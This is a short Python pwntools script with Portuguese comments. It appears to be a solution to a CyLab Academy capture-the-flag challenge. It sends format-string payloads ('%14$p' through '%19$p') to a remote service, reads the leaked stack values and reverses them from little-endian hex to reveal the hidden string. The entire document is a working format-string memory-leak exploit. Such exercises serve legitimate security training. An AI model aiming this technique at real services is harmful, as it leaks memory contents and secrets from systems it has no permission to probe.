from pwn import *

context.log_level = 'error'

for i in range(14, 20):  # Testa do índice 14 ao 19
    p = None
    try:
        p = remote('chatelaine.cylabacademy.net', 44859, timeout=3)
        
        # Usa %p para puxar o endereço/hex bruto
        payload = f"%{i}$p".encode()
        p.sendlineafter(b"Give me your order and I'll read it back to you:\n", payload)
        
        response = p.recvline(timeout=2).strip()
        
        # O retorno vem como: b"Here's your order: 0x7b796d6564616361"
        if b"0x" in response:
            hex_part = response.split(b"0x")[1].decode('utf-8')
            
            # Garante que tem um número par de caracteres hexadecimais
            if len(hex_part) % 2 != 0:
                hex_part = "0" + hex_part
                
            # Converte de hex para bytes
            raw_bytes = bytes.fromhex(hex_part)
            
            # Como o x86_64 é Little Endian, inverter os bytes revela a string original
            reversed_bytes = raw_bytes[::-1]
            
            print(f"[Index {i}] Hex: 0x{hex_part}")
            print(f"         ASCII (Direto): {raw_bytes}")
            print(f"         ASCII (Reverso/Little Endian): {reversed_bytes}\n")
            
    except Exception as e:
        print(f"[Index {i}] Erro: {e}")
        
    finally:
        if p:
            try:
                p.close()
            except:
                pass
    time.sleep(0.2)